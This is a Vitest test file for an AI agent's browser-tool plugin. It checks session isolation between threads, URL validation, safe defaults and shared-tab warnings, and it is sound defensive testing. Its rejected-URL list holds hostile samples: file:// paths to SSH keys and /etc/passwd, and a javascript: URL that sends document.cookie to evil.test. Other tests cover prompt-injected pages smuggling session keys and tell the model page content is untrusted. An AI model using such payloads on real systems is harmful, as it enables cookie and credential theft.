import { describe, expect, it, vi } from "vitest";
import type { z } from "zod";
import type { BbPluginApi } from "@bb/plugin-sdk";
import type { Actions } from "./actions.js";
import { createPageHolder } from "./holder.js";
import { registerTools, TOOL_NAMES } from "./tools.js";

interface Registered {
  name: string;
  description: string;
  parameters: z.ZodType;
  execute: (params: unknown, ctx: { threadId: string; projectId: string; signal: AbortSignal }) =>
    | unknown
    | Promise<unknown>;
}

function fakeActions() {
  return {
    open: vi.fn(async () => "opened"),
    read: vi.fn(async () => "page text"),
    snapshot: vi.fn(async () => "tree"),
    click: vi.fn(async () => "clicked"),
    type: vi.fn(async () => "typed"),
    evaluate: vi.fn(async () => "42"),
    screenshot: vi.fn(async () => ({ base64: "aGVsbG8=" })),
    close: vi.fn(async () => "closed"),
  } satisfies Record<keyof Actions, unknown>;
}

/**
 * Maps every thread to its own key. MX-229 is the case where this is NOT true,
 * so tests about contention pass a resolver that collapses siblings onto one.
 */
const oneKeyEach = (threadId: string | undefined) =>
  threadId ? `key-for-${threadId}` : "scratch";

function register(
  operations = fakeActions(),
  resolve: (threadId: string | undefined) => string = oneKeyEach,
) {
  const tools: Registered[] = [];
  const bb = {
    agents: { registerTool: (tool: Registered) => tools.push(tool) },
  } as unknown as BbPluginApi;

  // The resolver maps a thread to its ancestor's key — the tools must use
  // whatever it returns, not the raw threadId.
  const resolveSessionKey = vi.fn(async (threadId: string | undefined) =>
    resolve(threadId),
  );

  // The REAL holder over an in-memory kv, not a stub: the notice an agent sees
  // is the product of this logic, and a stub would let the wiring pass while the
  // message was wrong or absent.
  const store = new Map<string, unknown>();
  const holder = createPageHolder({
    kv: {
      get: async <T,>(key: string) => store.get(key) as T | undefined,
      set: async (key: string, value: unknown) => void store.set(key, value),
      delete: async (key: string) => void store.delete(key),
    },
  });

  registerTools(
    bb,
    operations as unknown as Actions,
    resolveSessionKey,
    { show: async () => "shown" },
    holder,
  );
  const byName = (name: string) => {
    const tool = tools.find((candidate) => candidate.name === name);
    if (!tool) throw new Error(`tool not registered: ${name}`);
    return tool;
  };
  const ctx = (threadId: string) => ({
    threadId,
    projectId: "prj_1",
    signal: new AbortController().signal,
  });
  return { tools, byName, ctx, operations, resolveSessionKey, holder };
}

/** Every key a tool's parameter schema advertises to the model. */
function schemaKeys(tool: Registered): string[] {
  const shape = (tool.parameters as unknown as { shape?: Record<string, unknown> }).shape;
  return shape ? Object.keys(shape) : [];
}

describe("registerTools", () => {
  it("registers exactly the tools TOOL_NAMES promises server.ts", () => {
    const { tools } = register();
    expect(tools.map((tool) => tool.name)).toEqual([...TOOL_NAMES]);
  });

  // THE security boundary: a thread addresses its own page and no other. If a
  // tool ever accepted a session key as a parameter, one thread could drive
  // another thread's logged-in browser by asking for it.
  it("exposes no session, thread or key parameter on any tool", () => {
    const { tools } = register();
    for (const tool of tools) {
      for (const key of schemaKeys(tool)) {
        expect(key).not.toMatch(/session|thread|profile|key/i);
      }
    }
  });

  it("advertises only the parameters each operation actually needs", () => {
    const { byName } = register();
    expect(schemaKeys(byName("browser_open"))).toEqual(["url"]);
    expect(schemaKeys(byName("browser_read"))).toEqual([]);
    expect(schemaKeys(byName("browser_snapshot"))).toEqual(["interactive"]);
    expect(schemaKeys(byName("browser_click"))).toEqual(["selector"]);
    expect(schemaKeys(byName("browser_type"))).toEqual(["selector", "text", "submit"]);
    expect(schemaKeys(byName("browser_eval"))).toEqual(["expression"]);
    expect(schemaKeys(byName("browser_close"))).toEqual([]);
    expect(schemaKeys(byName("browser_screenshot"))).toEqual([]);
  });

  // browser_show is the one tool that is not about a page: it asks for a
  // human, and the browser is shared, so it takes no session key by design.
  // Every OTHER tool must derive one — that is the boundary that stops a
  // thread reaching another thread's tab.
  const PAGELESS_TOOLS = ["browser_show"];

  it("derives the session key from ctx.threadId, for every page tool", async () => {
    const { tools, byName, ctx, operations, resolveSessionKey } = register();
    const params: Record<string, unknown> = {
      browser_open: { url: "https://example.com" },
      browser_click: { selector: "#a" },
      browser_type: { selector: "#a", text: "x", submit: false },
      browser_eval: { expression: "1+1" },
      browser_snapshot: { interactive: true },
    };
    for (const tool of tools) {
      if (PAGELESS_TOOLS.includes(tool.name)) continue;
      await tool.execute(params[tool.name] ?? {}, ctx("thr_a"));
    }
    expect(resolveSessionKey).toHaveBeenCalledWith("thr_a");
    // Whatever the resolver returned is what reached the operation — first
    // argument, every time.
    const everyCall = Object.values(operations).flatMap(
      (fn) => fn.mock.calls as unknown as unknown[][],
    );
    expect(everyCall.length).toBe(tools.length - PAGELESS_TOOLS.length);
    for (const call of everyCall) {
      expect(call[0]).toBe("key-for-thr_a");
    }
    expect(byName("browser_read")).toBeDefined();
  });

  it("gives two threads two different session keys", async () => {
    const { byName, ctx, operations } = register();
    await byName("browser_read").execute({}, ctx("thr_a"));
    await byName("browser_read").execute({}, ctx("thr_b"));
    expect(operations.read.mock.calls).toEqual([["key-for-thr_a"], ["key-for-thr_b"]]);
  });

  it("ignores any session key an injected page tries to smuggle in as a param", async () => {
    const { byName, ctx, operations } = register();
    await byName("browser_read").execute(
      { sessionKey: "thr_victim", threadId: "thr_victim" },
      ctx("thr_a"),
    );
    expect(operations.read).toHaveBeenCalledWith("key-for-thr_a");
  });

  it("passes each tool's parameters through to its operation", async () => {
    const { byName, ctx, operations } = register();
    await byName("browser_open").execute({ url: "https://example.com/" }, ctx("thr_a"));
    expect(operations.open).toHaveBeenCalledWith("key-for-thr_a", "https://example.com/");

    await byName("browser_type").execute(
      { selector: "#q", text: "hello", submit: true },
      ctx("thr_a"),
    );
    expect(operations.type).toHaveBeenCalledWith("key-for-thr_a", "#q", "hello", true);

    await byName("browser_snapshot").execute({ interactive: false }, ctx("thr_a"));
    expect(operations.snapshot).toHaveBeenCalledWith("key-for-thr_a", false);
  });

  // The identity resolver is what a ROOT thread really gets: createSessionKeyResolver
  // returns a thread id, so a thread that owns its page resolves to its own. The
  // default fixture returns a synthetic key on purpose (to prove the tools pass the
  // resolver's output through), and under it every thread looks like a non-owner —
  // which would prefix this shape with a shared-tab notice. The subject here is the
  // uncontended content part, so it takes the uncontended fixture.
  it("returns a well-formed image content part from browser_screenshot", async () => {
    const { byName, ctx } = register(fakeActions(), (threadId) => threadId ?? "scratch");
    const result = await byName("browser_screenshot").execute({}, ctx("thr_a"));
    expect(result).toEqual({
      content: [{ type: "image", data: "aGVsbG8=", mimeType: "image/png" }],
    });
  });

  // Every tool that can return page content says so. browser_show returns a
  // status line and no page text at all, so the warning would be noise there —
  // it carries its own caution instead, about relaunching mid-form.
  it("tells the model page content is untrusted, on every tool that returns any", () => {
    const { tools } = register();
    for (const tool of tools) {
      if (PAGELESS_TOOLS.includes(tool.name)) {
        expect(tool.description).toMatch(/relaunch/i);
        continue;
      }
      expect(tool.description).toMatch(/untrusted/i);
    }
  });
});

describe("browser_open's url schema", () => {
  const parse = (url: string) => {
    const { byName } = register();
    return byName("browser_open").parameters.safeParse({ url });
  };

  it.each([
    "file:///home/someone/.ssh/id_rsa",
    "file:///etc/passwd",
    "javascript:fetch('https://evil.test/'+document.cookie)",
    "data:text/html,<script>alert(1)</script>",
    "about:blank",
    "chrome://settings",
    "view-source:https://example.com",
    "ftp://example.com/secret.txt",
    "ws://127.0.0.1:9222/devtools/browser/abc",
    "blob:https://example.com/1234",
    "not a url",
  ])("rejects %s before it reaches the browser", (url) => {
    expect(parse(url).success).toBe(false);
  });

  it.each(["https://example.com/", "http://localhost:3000/x?y=1#z"])("accepts %s", (url) => {
    expect(parse(url).success).toBe(true);
  });
});

// Schema defaults are a safety surface, not a convenience.
//
// A mutation sweep flipped each of these with the whole suite still green.
// The defaults decide what happens when a model omits an argument, which is
// exactly when nobody is thinking about it: `submit` defaulting to true would
// press Enter on every fill — posting the comment, sending the message,
// submitting the form nobody asked to submit — on a surface whose input comes
// from pages this plugin treats as hostile.
describe("tool schema defaults", () => {
  it("does not submit when the model omits `submit`", () => {
    const { byName } = register();
    const parsed = byName("browser_type").parameters.parse({
      selector: "#q",
      text: "hello",
    }) as { submit: boolean };
    expect(parsed.submit).toBe(false);
  });

  it("still submits when the model asks for it", () => {
    const { byName } = register();
    const parsed = byName("browser_type").parameters.parse({
      selector: "#q",
      text: "hello",
      submit: true,
    }) as { submit: boolean };
    expect(parsed.submit).toBe(true);
  });

  it("snapshots the interactive tree when the model omits `interactive`", () => {
    const { byName } = register();
    const parsed = byName("browser_snapshot").parameters.parse({}) as {
      interactive: boolean;
    };
    expect(parsed.interactive).toBe(true);
  });

  it("passes the parsed default through to the operation", async () => {
    const { byName, ctx, operations } = register();
    const snapshot = byName("browser_snapshot");
    await snapshot.execute(snapshot.parameters.parse({}), ctx("thr_a"));
    expect(operations.snapshot).toHaveBeenCalledWith("key-for-thr_a", true);
  });
});

describe("tool schema required arguments", () => {
  it.each([
    ["browser_click", { selector: "" }],
    ["browser_type", { selector: "", text: "hi" }],
    ["browser_eval", { expression: "" }],
  ])("%s rejects an empty required string", (name, params) => {
    const { byName } = register();
    expect(byName(name).parameters.safeParse(params).success).toBe(false);
  });
});

// MX-229: three workers spawned from one parent all resolve to the parent's
// session key, so they drive ONE page and last-navigator-wins with no signal.
// The fix does not stop them sharing — it stops them sharing SILENTLY.
describe("a tab shared by sibling threads", () => {
  /** What MX-229 actually is: distinct threads, one page key. */
  const oneSharedKey = () => "thr_parent";

  it("warns the first spawned thread that the tab is not its own", async () => {
    const { byName, ctx } = register(fakeActions(), oneSharedKey);
    const result = await byName("browser_read").execute({}, ctx("thr_worker_a"));
    expect(result).toContain("SHARED PAGE");
    expect(result).toContain("thr_parent");
    // The result the agent asked for is still there, notice or not.
    expect(result).toContain("page text");
  });

  it("tells the displaced thread WHICH thread drove the page", async () => {
    const { byName, ctx } = register(fakeActions(), oneSharedKey);
    await byName("browser_open").execute({ url: "https://a.example" }, ctx("thr_worker_a"));
    const result = await byName("browser_read").execute({}, ctx("thr_worker_b"));
    expect(result).toContain("thr_worker_a");
    expect(result).toContain("page text");
  });

  it("warns BOTH ways as they take turns — every time, not just the first", async () => {
    const { byName, ctx } = register(fakeActions(), oneSharedKey);
    const read = byName("browser_read");
    await read.execute({}, ctx("thr_worker_a"));
    for (let round = 0; round < 3; round += 1) {
      expect(await read.execute({}, ctx("thr_worker_b"))).toContain("thr_worker_a");
      expect(await read.execute({}, ctx("thr_worker_a"))).toContain("thr_worker_b");
    }
  });

  it("says nothing to a thread driving its own page", async () => {
    const { byName, ctx } = register(fakeActions(), (threadId) => threadId ?? "scratch");
    const result = await byName("browser_read").execute({}, ctx("thr_alone"));
    expect(result).toBe("page text");
  });

  it("puts the notice beside the screenshot rather than swallowing it", async () => {
    const { byName, ctx } = register(fakeActions(), oneSharedKey);
    await byName("browser_open").execute({ url: "https://a.example" }, ctx("thr_worker_a"));
    const result = (await byName("browser_screenshot").execute({}, ctx("thr_worker_b"))) as {
      content: { type: string; text?: string }[];
    };
    expect(result.content.map((part) => part.type)).toEqual(["text", "image"]);
    expect(result.content[0]?.text).toContain("thr_worker_a");
  });

  it("returns the screenshot alone when nobody else has driven the page", async () => {
    const { byName, ctx } = register(fakeActions(), (threadId) => threadId ?? "scratch");
    const result = (await byName("browser_screenshot").execute({}, ctx("thr_alone"))) as {
      content: { type: string }[];
    };
    expect(result.content.map((part) => part.type)).toEqual(["image"]);
  });

  // browser_show asks mgrin to look at the window. It drives nothing, so a
  // thread that calls it must not be recorded as the page's last driver —
  // otherwise it steals the blame that belongs to whoever actually navigated.
  it("does not let browser_show claim a page it never drove", async () => {
    const { byName, ctx, holder } = register(fakeActions(), oneSharedKey);
    await byName("browser_open").execute({ url: "https://a.example" }, ctx("thr_worker_a"));
    await byName("browser_show").execute({}, ctx("thr_worker_b"));
    expect(await holder.lastDriver("thr_parent")).toBe("thr_worker_a");
  });

  // A thread with no id is bb's own scratch caller, not a competitor.
  it("stays silent when there is no thread to name", async () => {
    const { byName } = register(fakeActions(), oneSharedKey);
    const result = await byName("browser_read").execute(
      {},
      { threadId: undefined, projectId: "prj_1", signal: new AbortController().signal } as never,
    );
    expect(result).toBe("page text");
  });
});
